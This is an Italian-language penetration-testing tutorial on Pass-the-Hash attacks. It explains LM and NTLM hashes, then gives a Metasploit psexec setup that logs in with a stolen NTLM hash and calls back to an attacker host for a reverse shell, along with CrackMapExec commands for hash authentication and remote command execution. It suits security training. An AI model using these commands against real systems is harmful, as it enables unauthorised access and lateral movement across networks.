# Pass The Hash Attack

Il Pass-the-Hash (PtH) è una tecnica che consente di autenticarsi su un sistema remoto senza conoscere la password in chiaro, utilizzando direttamente l’hash NTLM dell’utente. <br>
È un metodo estremamente potente nel contesto del penetration testing perché **bypassa la necessità di conoscere la password vera e propria**, e permette comunque di accedere a servizi remoti che accettano l’autenticazione NTLM (come SMB o WinRM).

Esistono due tipi di HASH:
- **LM (LAN Manager)**: algoritmo obsoleto, case-insensitive (le lettere maiuscole/minuscole sono trattate allo stesso modo), divide le password in due blocchi da 7 caratteri e li cifra con DES. È estremamente debole e vulnerabile a bruteforce.
- **NTLM (NT LAN Manager)**: introdotto con Windows NT, usa un algoritmo basato su MD4, case-sensitive (distingue lettere maiuscole e minuscole), ed è molto più sicuro rispetto a LM, anche se non è salato, quindi vulnerabile a rainbow tables.

In ambienti moderni, **LM è disabilitato per default**, ma NTLM continua ad essere supportato, soprattutto per compatibilità legacy.

La capacità di catturare un hash NTLM è quindi fondamentale: esso rappresenta la “firma” digitale della password, e può essere utilizzato per ottenere l’accesso a risorse di rete, spostarsi lateralmente all'interno dell'infrastruttura e perfino compromettere interi domini Active Directory. <br>
A differenza delle password in chiaro, **gli hash NTLM spesso non vengono ruotati regolarmente** e, una volta ottenuti, **rimangono validi per lunghi periodi**, specialmente se associati ad account amministrativi.

## PSExex in Metasploit

Dopo aver ottenuto accesso a una macchina target con privilegi elevati, e aver estratto gli hash con Kiwi e Mimikatz, salviamo gli hash ottenuti in un file `hash.txt` in modo da poterli utilizzare piú facilmente.

`psexec` è un modulo exploit SMB che consente di autenticarsi tramite hash NTLM senza inserire passwords:
```bash
use exploit/windows/smb/psexec
set RHOST <IP>
set SMBUser Administrator    # é un utente di cui abbiamo l'hash NTLM
set SMBPass <NTLMHash>       # inseriamo l'hash dell'utente
set LHOST <KaliIP>
set LPORT <PORT>             # porta diversa da quella già in uso da meterpeter
set target Native upload     # forza l'upload via SMB (default più compatibile)
run
```
>Perché usare **target Native upload**? <br>
>Questo target è pensato per caricare manualmente il payload via SMB anziché usare metodi alternativi (come Powershell o VBScript) che possono essere bloccati dalle policy.
>È spesso il metodo più compatibile in ambienti legacy.

---

## 3 – Uso di CrackMapExec

**CrackMapExec** è un potente tool per testare la sicurezza dei protocolli SMB, WinRM, RDP e altri. Supporta l'autenticazione Pass-the-Hash:

`crackmapexec smb <IP> -u Administrator -H "<NTLMHash>"  # autentica con hash`

Se l'autenticazione ha successo, verrà visualizzato:
```
SMB         <IP>    445    Pwn3d!
```

Possiamo quindi eseguire comandi remoti con:

`crackmapexec smb <IP> -u Administrator -H "<NTLMHash>" -x "ipconfig"`

Questo comando eseguirà `ipconfig` sulla macchina bersaglio e restituirà l'output direttamente a schermo.

---
